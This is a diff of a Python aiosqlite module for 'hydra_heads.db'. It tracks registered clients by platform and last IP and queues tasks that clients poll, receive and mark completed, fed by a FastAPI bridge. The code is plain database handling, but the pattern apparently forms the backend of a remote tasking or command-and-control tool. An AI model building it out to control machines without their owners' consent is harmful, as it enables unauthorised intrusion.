@@ -1,53 +1,57 @@
 import aiosqlite
-import datetime
+import json
 
-DB_NAME = "hydra_heads.db"
+DB_PATH = "hydra_heads.db"
 
 async def init_db():
-    async with aiosqlite.connect(DB_NAME) as db:
-        # Table for tracking heads
+    async with aiosqlite.connect(DB_PATH) as db:
         await db.execute("""
-            CREATE TABLE IF NOT EXISTS heads (
-                id TEXT PRIMARY KEY,
+            CREATE TABLE IF NOT EXISTS clients (
+                client_id TEXT PRIMARY KEY,
                 platform TEXT,
-                ip TEXT,
+                last_ip TEXT,
                 last_seen TIMESTAMP DEFAULT CURRENT_TIMESTAMP
             )
         """)
-        # Table for tasks
         await db.execute("""
             CREATE TABLE IF NOT EXISTS tasks (
                 task_id INTEGER PRIMARY KEY AUTOINCREMENT,
                 client_id TEXT,
                 action TEXT,
                 payload TEXT,
-                status TEXT DEFAULT 'pending',
-                FOREIGN KEY(client_id) REFERENCES heads(id)
+                status TEXT DEFAULT 'pending'
             )
         """)
         await db.commit()
 
-async def register_client(client_id: str, platform: str, ip: str):
-    async with aiosqlite.connect(DB_NAME) as db:
+async def register_client(client_id, platform, last_ip):
+    async with aiosqlite.connect(DB_PATH) as db:
         await db.execute("""
-            INSERT INTO heads (id, platform, ip, last_seen)
+            INSERT OR REPLACE INTO clients (client_id, platform, last_ip, last_seen)
             VALUES (?, ?, ?, CURRENT_TIMESTAMP)
-            ON CONFLICT(id) DO UPDATE SET
-                last_seen = CURRENT_TIMESTAMP,
-                ip = excluded.ip
-        """, (client_id, platform, ip))
+        """, (client_id, platform, last_ip))
         await db.commit()
 
-async def get_pending_task(client_id: str):
-    async with aiosqlite.connect(DB_NAME) as db:
+async def get_pending_task(client_id):
+    async with aiosqlite.connect(DB_PATH) as db:
         db.row_factory = aiosqlite.Row
-        cursor = await db.execute(
+        async with db.execute(
             "SELECT * FROM tasks WHERE client_id = ? AND status = 'pending' LIMIT 1",
             (client_id,)
-        )
-        return await cursor.fetchone()
+        ) as cursor:
+            return await cursor.fetchone()
 
-async def complete_task(task_id: int):
-    async with aiosqlite.connect(DB_NAME) as db:
+async def complete_task(task_id):
+    async with aiosqlite.connect(DB_PATH) as db:
         await db.execute("UPDATE tasks SET status = 'completed' WHERE task_id = ?", (task_id,))
+        await db.commit()
+
+async def add_task(client_id, action, payload):
+    """Bridge for FastAPI to add tasks to the database asynchronously."""
+    async with aiosqlite.connect(DB_PATH) as db:
+        payload_json = json.dumps(payload)
+        await db.execute("""
+            INSERT INTO tasks (client_id, action, payload, status)
+            VALUES (?, ?, ?, 'pending')
+        """, (client_id, action, payload_json))
         await db.commit()
